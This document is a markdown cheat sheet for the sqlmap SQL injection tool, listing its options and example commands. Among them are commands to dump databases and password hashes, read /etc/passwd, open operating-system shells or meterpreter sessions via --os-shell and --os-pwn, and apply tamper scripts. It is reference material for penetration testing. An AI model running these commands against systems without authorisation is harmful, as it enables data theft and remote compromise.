# SQLMAP

| Category                          | Details / Commands                                          |
|-----------------------------------|-------------------------------------------------------------|
| **Basic arguments for SQLmap**    |                                                             |
| Generic                           | -u "\<URL\>"<br>-p "\<PARAM TO TEST\>"<br>--user-agent=SQLMAP<br>--random-agent<br>--threads=10<br>--risk=3 #MAX<br>--level=5 #MAX<br>--dbms="\<KNOWN DB TECH\>"<br>--os="\<OS\>"<br>--technique="UB" #Use only techniques UNION and BLIND in that order (default "BEUSTQ")<br>--batch #Non interactive mode<br>--auth-type="\<AUTH\>" #HTTP authentication type<br>--auth-cred="\<AUTH\>" #HTTP authentication credentials<br>--proxy=http://127.0.0.1:8080<br>--union-char "GsFRts2" #Help sqlmap identify union SQLi techniques |
| Retrieve Information              |                                                             |
| Internal                          | --current-user #Get current user<br>--is-dba #Check if current user is Admin<br>--hostname #Get hostname<br>--users #Get usernames od DB<br>--passwords #Get passwords of users in DB<br>--privileges #Get privileges |
| DB data                           | --all #Retrieve everything<br>--dump #Dump DBMS database table entries<br>--dbs #Names of the available databases<br>--tables #Tables of a database ( -D \<DB NAME\> )<br>--columns #Columns of a table  ( -D \<DB NAME\> -T \<TABLE NAME\> )<br>-D \<DB NAME\> -T \<TABLE NAME\> -C \<COLUMN NAME\> #Dump column |
| Injection place                   |                                                             |
| From Burp/ZAP capture             | Capture the request and create a req.txt file<br>sqlmap -r req.txt --current-user |
| GET Request Injection             | sqlmap -u "http://example.com/?id=1" -p id<br>sqlmap -u "http://example.com/?id=\*" -p id |
| POST Request Injection            | sqlmap -u "http://example.com" --data "username=\*&password=\*" |
| Injections in Headers & Methods   | --cookie, --headers, --method (examples provided in original text) |
| Indicate string when successful   | --string="string_showed_when_TRUE"                           |
| Eval                               | (Example provided in original text)                          |
| Shell                              | --os-cmd, --os-shell, --os-pwn (examples provided)           |
| Read File                          | --file-read=/etc/passwd                                      |
| Crawl and auto-exploit            | (Command provided in original text)                          |
| Second Order Injection            | (Examples provided in original text)                         |
| Customizing Injection             | --suffix, --prefix (examples provided)                       |
| Help finding boolean injection    | --not-string (example provided)                              |
| Tamper                             | --tamper (list of tampers provided in original text)         |


| Command                          | Description                                                  |
|----------------------------------|--------------------------------------------------------------|
| **General Options**              |                                                              |
| -h, --help                       | Show the basic help message and exit                         |
| -u URL, --url=URL                | Target URL (e.g. "http://www.site.com/vuln.php?id=1")        |
| -v VERBOSE                       | Verbosity level: 0-6 (default 1)                             |
| **Request**                      |                                                              |
| --data=DATA                      | Data string to be sent through POST                          |
| --cookie=COOKIE                  | HTTP Cookie header                                           |
| --random-agent                   | Use randomly selected HTTP User-Agent header                 |
| --proxy=PROXY                    | Use a proxy to connect to the target URL                     |
| --headers=HEADERS                | Extra headers (e.g. "X-Forwarded-For: 127.0.0.1")            |
| **Injection Points**             |                                                              |
| -p TESTPARAMETER                 | Testable parameter(s)                                        |
| --level=LEVEL                    | Level of tests to perform (1-5, default 1)                   |
| --risk=RISK                      | Risk of tests to perform (0-3, default 1)                    |
| **Detection**                    |                                                              |
| --string=STRING                  | String to match when query is true                           |
| --regexp=REGEXP                  | Regexp to match when query is true                           |
| --dbms=DBMS                      | Force back-end DBMS to provided value                        |
| --os=OS                          | Force back-end DBMS operating system to provided value       |
| **Techniques**                   |                                                              |
| --technique=TECH                 | SQL injection techniques to use (default "BEUSTQ")           |
| **Enumeration**                  |                                                              |
| --dbs                            | Enumerate DBMS databases                                     |
| --tables                         | Enumerate DBMS database tables                               |
| --columns                        | Enumerate DBMS database table columns                        |
| --schema                         | Enumerate DBMS schema                                        |
| --current-user                   | Enumerate DBMS current user                                  |
| --current-db                     | Enumerate DBMS current database                              |
| --passwords                      | Enumerate DBMS users password hashes                         |
| --dump                           | Dump DBMS database table entries                             |
| --dump-all                       | Dump all DBMS databases tables entries                       |
| --search                         | Search column(s), table(s) and/or database name(s)           |
| **File System Access**           |                                                              |
| --file-read=RFILE                | Read a file from the back-end DBMS file system               |
| --file-write=WFILE               | Write a local file on the back-end DBMS file system          |
| **Operating System Access**      |                                                              |
| --os-cmd=OSCMD                   | Execute an operating system command                          |
| --os-shell                       | Prompt for an interactive operating system shell             |
| --os-pwn                         | Prompt for an out-of-band shell, meterpreter or VNC          |
| **Miscellaneous**                |                                                              |
| --batch                          | Never ask for user input, use the default behavior           |
| --tamper=TAMPER                  | Use given script(s) for tampering injection
